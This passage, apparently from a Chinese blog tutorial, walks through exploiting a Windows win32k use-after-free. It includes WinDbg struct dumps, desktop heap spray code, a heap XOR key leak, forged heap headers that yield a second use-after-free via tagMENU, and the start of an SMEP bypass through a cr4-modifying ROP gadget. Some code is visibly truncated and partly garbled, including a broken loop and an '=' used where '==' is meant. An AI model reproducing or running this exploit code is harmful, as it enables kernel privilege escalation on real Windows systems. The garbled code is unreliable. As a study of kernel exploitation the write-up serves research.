前面介绍过`_LARGE_UNICODE_STRING` 结构，我们知道它的Buffer结构是一个指针，我们想通过它来实现任意内存访问，所以这里我们想的是在
tagPROP 后面接上一个 `_LARGE_UNICODE_STRING` 结构，修改Buffer字段，然而你会发现，其实我们并不能完全控制到
Buffer 那里
    2: kd> dt -v win32k!_LARGE_UNICODE_STRING -r
    struct _LARGE_UNICODE_STRING, 4 elements, 0x10 bytes
       +0x000 Length           : Uint4B // 可控
       +0x004 MaximumLength    : Bitfield Pos 0, 31 Bits // 可控
       +0x004 bAnsi            : Bitfield Pos 31, 1 Bit  // 可控
       +0x008 Buffer           : Ptr64 to Uint2B // 想要修改这里,但是刚好是atomKey和fs属性,不完全可控
不能覆盖到哪里，我们就得想其他的办法，如果你看过前面的一些堆头的paper，那你可能会想到，我们这里最终选择的是`_HEAP_ENTR`这个结构，其大小是
0x10，这里主要关注注释的内容，学过PWN堆部分的小伙伴有没有很眼熟，什么prev_size，size，fd，bk啥的对比过来不就很眼熟了么，只不过这里有一个`SmallTagIndex`的校验码，这是Windows的一个安全机制，为了防止堆头被修改，你可以类比PWN保护机制中的Canary
    1: kd> dt -v !_HEAP_ENTRY
    nt!_HEAP_ENTRY
    struct _HEAP_ENTRY, 22 elements, 0x10 bytes
       +0x000 PreviousBlockPrivateData : Ptr64 to Void
       +0x008 Size             : Uint2B // 当前块的大小
       +0x00a Flags            : UChar // 是否空闲
       +0x00b SmallTagIndex    : UChar // 安全校验码
       +0x00c PreviousSize     : Uint2B // 前一块的大小
       +0x00e SegmentOffset    : UChar
       +0x00e LFHFlags         : UChar
       +0x00f UnusedBytes      : UChar
       +0x008 CompactHeader    : Uint8B
       +0x000 Reserved         : Ptr64 to Void
       +0x008 FunctionIndex    : Uint2B
       +0x00a ContextValue     : Uint2B
       +0x008 InterceptorValue : Uint4B
       +0x00c UnusedBytesLength : Uint2B
       +0x00e EntryOffset      : UChar
       +0x00f ExtendedBlockSignature : UChar
       +0x000 ReservedForAlignment : Ptr64 to Void
       +0x008 Code1            : Uint4B
       +0x00c Code2            : Uint2B
       +0x00e Code3            : UChar
       +0x00f Code4            : UChar
       +0x008 AgregateCode     : Uint8B
我们这里想的是覆盖堆头的 Size 字段，伪造堆的大小，当然这里我们也需要绕过保护，先不管保护怎么绕过，如果我们在下一个堆块后面放置一个 tagMENU
结构，然后我们将整块给 free 掉，因为 tagMENU 句柄未变，所以我们这里会再次产生一个 UAF 漏洞，这里我先贴桌面堆喷射实现的代码
    BOOL SprayObject()
    {
        int j = 0;
        CHAR o1str[OVERLAY1_SIZE - _HEAP_BLOCK_SIZE] = { 0 };
        CHAR o2str[OVERLAY2_SIZE - _HEAP_BLOCK_SIZE] = { 0 };
        LARGE_UNICODE_STRING o1lstr, o2lstr;
        // build first overlay
        memset(o1str, 'x43', OVERLAY2_SIZE - _HEAP_BLOCK_SIZE);
        RtlInitLargeUnicodeString(&o1lstr, (WCHAR*)o1str, (UINT)-1, OVERLAY1_SIZE - _HEAP_BLOCK_SIZE - 2);
        // build second overlay
        memset(o2str, 'x41', OVERLAY2_SIZE - _HEAP_BLOCK_SIZE);
        RtlInitLargeUnicodeString(&o2lstr, (WCHAR*)o2str, (UINT)-1, OVERLAY2_SIZE - _HEAP_BLOCK_SIZE - 2);
        SHORT unused_win_index = 0x20;
        for (SHORT i = 0; i aheList;
        while (VirtualQuery(Addr, &MemInfo, sizeof(MemInfo)))
        {
            if (MemInfo.Protect = PAGE_READONLY && MemInfo.Type == MEM_MAPPED && MemInfo.State == MEM_COMMIT)
            {
                if ( *(UINT *)((BYTE *)MemInfo.BaseAddress + 0x10) == 0xffeeffee )
                {
                    if (*(ULONG_PTR *)((BYTE *)MemInfo.BaseAddress + 0x28) == (ULONG_PTR)((BYTE *)MemInfo.BaseAddress + deltaDHeap))
                    {
                        xorKey.append( (CHAR*)((BYTE *)MemInfo.BaseAddress + 0x80), 16 );
                        return TRUE;
                    }
                }
            }
            Addr += MemInfo.RegionSize;
        }
        return FALSE;
    }
通过上面的泄露我们就可以继续完善堆喷的代码了，现在就可以在堆喷函数中加上对堆头的操作了
    memset(o2str, 'x41', OVERLAY2_SIZE - _HEAP_BLOCK_SIZE);
    *(DWORD *) o2str        = 0x00000000;
    *(DWORD *)(o2str+4)     = 0x00000000;
    *(DWORD *)(o2str+8)     = 0x00010000 + OVERLAY2_SIZE;
    *(DWORD *)(o2str+12)    = 0x10000000 + ((OVERLAY1_SIZE+MENU_SIZE+_HEAP_BLOCK_SIZE)/0x10);
    string clearh, newh;
    o2str[11] = o2str[8] ^ o2str[9] ^ o2str[10];
    clearh.append(o2str, 16);
    newh = XOR(clearh, xorKey);
    memcpy(o2str, newh.c_str(), 16);
    RtlInitLargeUnicodeString(&o2lstr, (WCHAR*) o2str, (UINT) - 1, OVERLAY2_SIZE - _HEAP_BLOCK_SIZE - 2);
###  Bypass SMEP
对于SMEP的绕过主要是对cr4寄存器的修改，这里我的rop是用的`nt!KiConfigureDynamicProcessor+0x40`片断实现对cr4寄存器的修改，代码实现如下
    DWORD64 ntoskrnlbase()
    {
        LPVOID lpImageBase[0x100];
        LPDWORD lpcbNeeded = NULL;
        TCHAR lpfileName[1024];
        //Retrieves the load address for each device driver in the system
        EnumDeviceDrivers(lpImageBase, (DWORD64)sizeof(lpImageBase), lpcbNeeded);
        for (int i = 0; i 
  2. 回调函数：
  3. wjllz师傅的文章： 
  4. 0xgd师傅的文章： 
  5. Udi的分析：
  6. 泄露内核地址： 
  7. 40k0师傅的分析： 
  8. 小刀志师傅的博客： 